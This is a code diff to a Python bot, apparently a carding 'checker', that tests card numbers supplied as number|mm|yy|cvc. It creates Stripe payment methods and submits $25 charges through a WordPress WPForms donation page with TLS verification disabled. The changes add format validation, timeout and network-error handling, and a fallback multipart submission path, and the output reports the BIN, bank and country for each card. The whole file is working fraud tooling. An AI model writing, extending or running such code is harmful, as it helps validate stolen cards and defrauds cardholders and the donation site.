@@ -10,7 +10,14 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 import urllib3
 import threading
-from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+# Try to import MultipartEncoder, fallback to files if not available
+try:
+    from requests_toolbelt.multipart.encoder import MultipartEncoder
+    HAS_MULTIPART_ENCODER = True
+except ImportError:
+    HAS_MULTIPART_ENCODER = False
+    print("Warning: requests_toolbelt not installed. Using fallback method.")
 
 # Disable warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -267,6 +274,21 @@ def check_card_st25(cc_line):
     start_time = time.time()
     max_retries = 2
     
+    # Quick validation first
+    if not cc_line or '|' not in cc_line:
+        elapsed_time = time.time() - start_time
+        return f"""
+ERROR ❌
+
+💳𝗖𝗖 ⇾ {cc_line}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation
+
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+    
     for attempt in range(max_retries):
         try:
             # Parse card details
@@ -374,7 +396,40 @@ ERROR ❌
                 'key': STRIPE_KEY,
             }
             
-            response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, verify=False)
+            try:
+                response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15, verify=False)
+            except requests.exceptions.Timeout:
+                elapsed_time = time.time() - start_time
+                return f"""
+ERROR ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request timeout (Stripe API) ❌
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            except requests.exceptions.RequestException as e:
+                elapsed_time = time.time() - start_time
+                return f"""
+ERROR ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error: {str(e)[:100]} ❌
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
             
             if response.status_code != 200:
                 elapsed_time = time.time() - start_time
@@ -471,32 +526,121 @@ DECLINED CC ❌
             # Generate random token (32 hex characters)
             wpforms_token = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
             
-            # Build multipart form data using MultipartEncoder
-            multipart_data = MultipartEncoder(
-                fields={
-                    'wpforms[fields][0][first]': first_name,
-                    'wpforms[fields][0][last]': last_name,
-                    'wpforms[fields][1]': EMAIL,  # Keep email as is
-                    'wpforms[fields][3]': '5',
-                    'wpforms[fields][4]': '$25.00',
-                    'wpforms[id]': '1236',
-                    'page_title': 'stripe payment',
-                    'page_url': f'{BASE_URL}/stripe-payment/',
-                    'url_referer': '',
-                    'page_id': '1238',
-                    'wpforms[post_id]': '1238',
-                    'wpforms[payment_method_id]': payment_method_id,
-                    'wpforms[token]': wpforms_token,
-                    'action': 'wpforms_submit',
-                    'start_timestamp': start_timestamp,
-                    'end_timestamp': end_timestamp,
-                },
-                boundary=boundary
-            )
-            
-            headers['content-type'] = multipart_data.content_type
-            
-            response = r.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=multipart_data, timeout=30, verify=False)
+            # Build multipart form data
+            if HAS_MULTIPART_ENCODER:
+                # Use MultipartEncoder if available
+                multipart_data = MultipartEncoder(
+                    fields={
+                        'wpforms[fields][0][first]': first_name,
+                        'wpforms[fields][0][last]': last_name,
+                        'wpforms[fields][1]': EMAIL,  # Keep email as is
+                        'wpforms[fields][3]': '5',
+                        'wpforms[fields][4]': '$25.00',
+                        'wpforms[id]': '1236',
+                        'page_title': 'stripe payment',
+                        'page_url': f'{BASE_URL}/stripe-payment/',
+                        'url_referer': '',
+                        'page_id': '1238',
+                        'wpforms[post_id]': '1238',
+                        'wpforms[payment_method_id]': payment_method_id,
+                        'wpforms[token]': wpforms_token,
+                        'action': 'wpforms_submit',
+                        'start_timestamp': start_timestamp,
+                        'end_timestamp': end_timestamp,
+                    },
+                    boundary=boundary
+                )
+                headers['content-type'] = multipart_data.content_type
+                try:
+                    response = r.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=multipart_data, timeout=15, verify=False)
+                except requests.exceptions.Timeout:
+                    elapsed_time = time.time() - start_time
+                    return f"""
+ERROR ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request timeout (WordPress) ❌
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                except requests.exceptions.RequestException as e:
+                    elapsed_time = time.time() - start_time
+                    return f"""
+ERROR ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error: {str(e)[:100]} ❌
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            else:
+                # Fallback: Use files parameter
+                files = {
+                    'wpforms[fields][0][first]': (None, first_name),
+                    'wpforms[fields][0][last]': (None, last_name),
+                    'wpforms[fields][1]': (None, EMAIL),
+                    'wpforms[fields][3]': (None, '5'),
+                    'wpforms[fields][4]': (None, '$25.00'),
+                    'wpforms[id]': (None, '1236'),
+                    'page_title': (None, 'stripe payment'),
+                    'page_url': (None, f'{BASE_URL}/stripe-payment/'),
+                    'url_referer': (None, ''),
+                    'page_id': (None, '1238'),
+                    'wpforms[post_id]': (None, '1238'),
+                    'wpforms[payment_method_id]': (None, payment_method_id),
+                    'wpforms[token]': (None, wpforms_token),
+                    'action': (None, 'wpforms_submit'),
+                    'start_timestamp': (None, start_timestamp),
+                    'end_timestamp': (None, end_timestamp),
+                }
+                # Remove content-type header for files parameter (requests will set it)
+                headers.pop('content-type', None)
+                try:
+                    response = r.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, files=files, timeout=15, verify=False)
+                except requests.exceptions.Timeout:
+                    elapsed_time = time.time() - start_time
+                    return f"""
+ERROR ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request timeout (WordPress) ❌
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                except requests.exceptions.RequestException as e:
+                    elapsed_time = time.time() - start_time
+                    return f"""
+ERROR ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error: {str(e)[:100]} ❌
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
             
             elapsed_time = time.time() - start_time
             
